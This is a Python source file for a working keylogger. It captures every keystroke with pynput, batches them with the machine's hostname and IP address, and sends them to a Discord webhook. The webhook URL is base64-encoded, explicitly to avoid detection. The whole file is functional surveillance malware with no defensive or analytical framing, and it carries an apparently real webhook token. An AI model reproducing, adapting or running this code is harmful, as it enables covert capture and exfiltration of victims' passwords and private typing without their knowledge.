# Import necessary modules with error handling to ensure all dependencies are met.
try:
    import base64  # Provides encoding and decoding functionality for base64.
    import json  # Facilitates conversion between Python objects and JSON format.
    import asyncio  # Supports asynchronous programming, enabling non-blocking I/O operations.
    import socket  # Allows access to network-related operations, such as fetching IP addresses.
    import requests  # Simplifies sending HTTP requests, making API interactions straightforward.
    import logging  # Provides a flexible framework for logging events, useful for debugging and monitoring.
    from datetime import (
        datetime,
    )  # Supplies date and time functionalities for timestamping events.
    from pynput.keyboard import (
        Key,
        Listener,
    )  # Captures keyboard inputs, essential for logging keystrokes.
except ImportError as error:
    # If any required module is missing, raise an ImportError to indicate which dependency is missing.
    raise error
finally:
    # Print a greeting message as an initial indication that the script has started.
    print("~Hello~")


class Keylogger:
    """
    The `Keylogger` class is designed to monitor and log keystrokes from the user's keyboard.
    The logged keystrokes are then sent to a remote server via a webhook URL. This class
    includes functionality for capturing keyboard inputs, encoding them, and transmitting
    them over the network.

    Attributes:
        pressed_keys (list): Stores the keys that have been pressed by the user.
        url (str): The webhook URL where the keystroke logs are sent. This URL is obfuscated
                   using base64 encoding to prevent easy detection.
    """

    def __init__(self):
        """
        Initializes the Keylogger class by setting up the initial state and decoding
        the webhook URL from base64 encoding. This URL is used to send the captured
        keystrokes to a remote server.
        """
        # Initialize the parent class
        super(Keylogger, self).__init__()
        # Create an empty list to hold the pressed keys
        self.pressed_keys = []

        """
        The URL for the webhook is base64 encoded to provide a basic level of obfuscation
        and to prevent the URL from being easily readable in plain text. It is crucial to
        replace this URL with your own webhook endpoint to ensure that the data is sent
        to the correct location. The URL should be kept confidential to avoid unauthorized
        access and monitoring.
        """
        # Decode the base64 encoded webhook URL
        self.url = base64.b64decode(
            "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3OTQwMjQ1NjQzMzgyMzgwNi9mX1FEN05hWHViOU5RSWlWajJVYU05VzEtMGN5RG12UGgzRmZYOUZFYjVJbDFOLTdfWnlva1pvUEFfU3kxeFlFd3d4bQ=="
        ).decode("utf-8")

    async def payload_to_server(self, message):
        """
        Asynchronously sends the keystroke data (payload) to the specified webhook URL.

        This method gathers information about the machine, including its hostname, IP address,
        and the current timestamp. It then constructs a JSON payload containing this information
        along with the captured keyboard inputs. The payload is sent to the server using a POST
        request.

        :param message: A string containing the captured keystrokes to be sent to the server.
        """
        # Retrieve the machine's hostname and IP address
        _machine_name_ = socket.gethostname()
        _ip_address_ = socket.gethostbyname(_machine_name_)
        # Obtain the current time for timestamping the log entry
        _current_time_ = datetime.now().time()

        # Construct the payload as a dictionary
        parameters = {
            "username": "Keylogger",  # Username to identify the sender of the message
            "content": (  # The content of the message including the timestamp, machine info, and keystrokes
                f"***************\n"
                f"Timestamp: {_current_time_}\n"  # Time when the message was generated
                f"Machine Name: {_machine_name_}\n"  # Name of the machine where the keystrokes were captured
                f"Current IP: {_ip_address_}\n"  # IP address of the machine
                f"Keyboard Input: {message}\n"  # The actual keystrokes captured
                f"***************"
            ),
        }

        # Attempt to send the payload to the server using a POST request
        try:
            response = requests.post(
                self.url,
                headers={
                    "Content-Type": "application/json"
                },  # Set the content type to JSON
                data=json.dumps(
                    parameters
                ),  # Convert the parameters dictionary to a JSON string
            )
            # Log the status code of the response for monitoring purposes
            logging.info(f"Payload sent  {response.status_code}")
        except Exception as e:
            # Log any exceptions that occur during the request for debugging and error tracking
            logging.error(f"Failed to send payload: {e}")

    def log(self):
        """
        Starts the keylogger to listen for keyboard events. This method sets up the keyboard
        listener and waits for keystrokes to be captured.

        The listener will call the `keyboard_pressed` method each time a key is pressed.
        """
        # Create a keyboard listener that calls `keyboard_pressed` on key press events
        with Listener(on_press=self.keyboard_pressed) as listener:
            # Keep the listener running indefinitely
            listener.join()

    def keyboard_pressed(self, key):
        """
        Callback function triggered whenever a key is pressed. This method logs the key press,
        appends it to the list of pressed keys, and sends the keystroke data to the server if
        the number of pressed keys exceeds a specified threshold.

        :param key: The key object representing the key that was pressed.
        """
        # Append the pressed key to the list of pressed keys
        self.pressed_keys.append(str(key))
        # Log the key press event for debugging and monitoring
        logging.info(f"Keyboard Pressed => {str(key)}")

        # If the number of pressed keys exceeds 20, send the data to the server
        if len(self.pressed_keys) > 20:
            # Use asyncio to run the `payload_to_server` method asynchronously
            asyncio.run(self.payload_to_server(str(self.pressed_keys)))
            # Clear the list of pressed keys after sending the data to the server
            self.pressed_keys.clear()


if __name__ == "__main__":
    # Configure the logging system to display messages at the INFO level
    logging.basicConfig(level=logging.INFO)

    # Instantiate the Keylogger class
    keylogger = Keylogger()
    # Start logging keystrokes by invoking the `log` method
    keylogger.log()
